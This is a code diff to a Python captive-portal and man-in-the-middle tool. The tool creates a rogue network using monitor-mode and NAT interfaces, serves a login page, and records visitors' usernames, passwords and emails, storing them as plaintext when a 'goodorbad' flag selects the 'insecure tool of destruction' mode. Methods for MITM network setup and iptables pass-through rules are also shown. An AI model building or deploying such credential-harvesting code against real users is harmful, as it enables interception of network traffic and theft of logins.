@@ -15,9 +15,9 @@ from http.server import HTTPServer as Webserver
 
 #internal stuff
 import core
-from core import JSONCommand,CaptiveClient,PybashyDB
 from core import error_printer
 from backendDB import * 
+from backendDB import JSONCommand,CaptiveClient,PybashyDB
 from backendDB import greenprint,blueprint,redprint,yellow_bold_print
 from backendDB import error_printer
 
@@ -54,22 +54,22 @@ parser.add_argument('--monitor_iface',
                                  dest    = 'moniface',
                                  action  = "store" ,
                                  default = 'mon0' ,
-                                 help    = "" )
+                                 help    = "The interface name of the Interface in monitor mode " )
 parser.add_argument('--ethernet_iface',
                                  dest    = 'iface',
                                  action  = "" ,
                                  default = '' ,
-                                 help    = "" )
-parser.add_argument('--ethernet_iface_name',
-                                 dest    = 'iface_name',
-                                 action  = "" ,
-                                 default = '' ,
-                                 help    = "" )                                 
+                                 help    = "Outward facing interface, the one that connects to the internet" )
+parser.add_argument('--NAT_iface',
+                                 dest    = 'NAT_iface',
+                                 action  = "store" ,
+                                 default = 'eth1' ,
+                                 help    = "Inward facing interface, the one that will handle clients in the network you create")
 parser.add_argument('--filename',
                                  dest    = 'filename',
-                                 action  = "" ,
-                                 default = '' ,
-                                 help    = "" )                                 
+                                 action  = "store" ,
+                                 default = 'database.db' ,
+                                 help    = "Filename to use for database" )                                 
 parser.add_argument('--port',
                                  dest    = 'port',
                                  action  = "store" ,
@@ -90,36 +90,16 @@ parser.add_argument('--',
                                  action  = "" ,
                                  default = '' ,
                                  help    = "" )                                 
-parser.add_argument('--',
-                                 dest    = '',
-                                 action  = "" ,
-                                 default = '' ,
-                                 help    = "" )                                 
+parser.add_argument('--goodorbad',
+                                 dest    = 'goodorbad',
+                                 action  = "store" ,
+                                 default = 'good' ,
+                                 help    = "Will determine if this is an insecure tool of destruction or a useful tool of networking" )                                 
 parser.add_argument('--debug',
                                  dest    = 'debug',
                                  action  = "store" ,
                                  default = 'True' ,
                                  help    = 'Verbose Output and Debug Pages are enabled with this "Default : On " option' )                                 
-
-
-#########################################################
-###         INITIALIZE DATABASE TABLES
-#########################################################
-testuser = CaptiveClient(Hostname= "mainbrain",
-                         username= "johnmclaine",
-                         password= "machinegun",
-                         macaddr = "de:ad:be:ef:ca:fe",
-                         email   = "nicecop@nakatomi.com",
-                         notes   = "treat with respect",
-                        )
-
-try:
-    PybashyDB.create_all()
-    PybashyDB.session.commit()
-except Exception:
-    exc_type, exc_value, exc_tb = sys.exc_info()
-    tb = traceback.TracebackException(exc_type, exc_value, exc_tb) 
-    core.error_message("[-] Database Table Creation FAILED \n" + ''.join(tb.format_exception_only()))
 
 #########################################################
 ###        Page Mirroring Tool
@@ -147,11 +127,8 @@ class GetPage():
 #########################################################
 
 class BackendServer():
-    def __init__(self, progargs, inames = ['username','email','password'] ):
+    def __init__(self, progargs):
         '''
-iname are the inputs you are attempting to capture
-    pass it the names as strings in a list
-        - [str,str,str,str]
         
         '''
         # basic variables for existance
@@ -204,7 +181,7 @@ iname are the inputs you are attempting to capture
             httpd.serve_forever()
         except KeyboardInterrupt:
             pass
-    
+
     #function containing the linux commands necesary for operation
     def EstablishMITMnetwork(self):
         ''' functions as command payloads should not be called until the class is initialized'''
@@ -436,30 +413,6 @@ class CaptivePortal(http.server.SimpleHTTPRequestHandler):
         self.hostlist = []
         self.credentials = []
     
-    def was_there_was_an_error(self, status_code):
-        '''
-Returns True if no error
-        '''
-        # server side error
-        set1 = [404,504,503,500]
-        set2 = [400,405,501]
-        set3 = [500]
-        if status_code in set1 :
-            blueprint("[-] Server side error - No Image Available in REST response")
-            yellow_bold_print("Error Code".format(status_code))
-            return False # "[-] Server side error - No {}} Available in REST response"
-        if status_code in set2:
-            redprint("[-] User error in Image Request")
-            yellow_bold_print("Error Code".format(status_code))
-            return False # "[-] User error in Request"
-        if status_code in set3:
-            #unknown error
-            blueprint("[-] Unknown Server Error")
-            yellow_bold_print("Error Code".format(status_code))
-            return False # "[-] Unknown Server Error - No {} Available in REST response"
-        # no error!
-        if status_code == 200:
-            return True
 
     def GrabStats(self):
         """
@@ -507,7 +460,7 @@ Debugging Function to display backend information
     def authpassthrough(self):
         steps = {
             "IPTablesAllowRemoteNAT": {
-                "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(self.remote_ip),
+                "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(self.remote_IP),
                 "info_message"    : "[+] Allowing Remote Into NAT",
                 "success_message" : "[+] Command Sucessful", 
                 "failure_message" : "[-] Command Failed! Check the logfile!"           
@@ -523,7 +476,7 @@ Debugging Function to display backend information
     def authenticate(self, username, password): 
         #check user/pass
             #if they are already in the Db, pass them through the firewall
-        if core.DoesUsernameExist(username) == True:
+        if DoesUsernameExist(username) == True:
             # run auth function
             redprint('Updating IP tables to allow {} through'.format(self.remote_IP))
             core.PybashyRunFunction(self.authpassthrough())
@@ -532,9 +485,9 @@ Debugging Function to display backend information
             greenprint('adding to address pool')
             self.networkaddrpool.append(self.remote_IP)
             #set user to active and log them in
-            core.
+            #core.
         #if they are not in the DB, force them to authenticate
-        elif core.DoesUsernameExist(username) == False :
+        elif DoesUsernameExist(username) == False :
             self.wfile.write(self.login())
         else:
             #Put a success message up
@@ -554,7 +507,7 @@ Required Param:
 Optional Param:
     filename : str
 
-    Saves all the information from the client in either an sqlite3 DB ot text file
+    Saves all the information from the client in either an sqlite3 DB or text file
     if the global option: 
 
         BAD = True 
@@ -562,7 +515,7 @@ Optional Param:
     will store passwords as plaintext
 '''
         try:
-            remote_IP = self.client_address[0]
+            self.remote_IP = self.client_address[0]
             #add the new clients credentials to storage
             self.hostlist.append(self.remote_IP)
             self.formdata = cgi.FieldStorage()
@@ -579,12 +532,11 @@ Optional Param:
             #saved as plaintext if BAD option set
             elif fileorsql == "file":
                 with open(filename, 'ab') as filehandle:
-                    input1 = self.formdata.getvalue("username")
-                    input2 = self.formdata.getvalue("password")
-                    input3 = self.formdata.getvalue("email")
-                    filehandle.write(self.formdata.getvalue(i1name))
+
+                    filehandle.write(self.formdata.getvalue("username"))
                     filehandle.write('\n')
-                    filehandle.write(self.formdata.getvalue(i2name))
+                    filehandle.write(self.formdata.getvalue("password"))
+                    filehandle.write(self.formdata.getvalue("email"))
                     filehandle.write('\n\n')
                     filehandle.close()
         except:
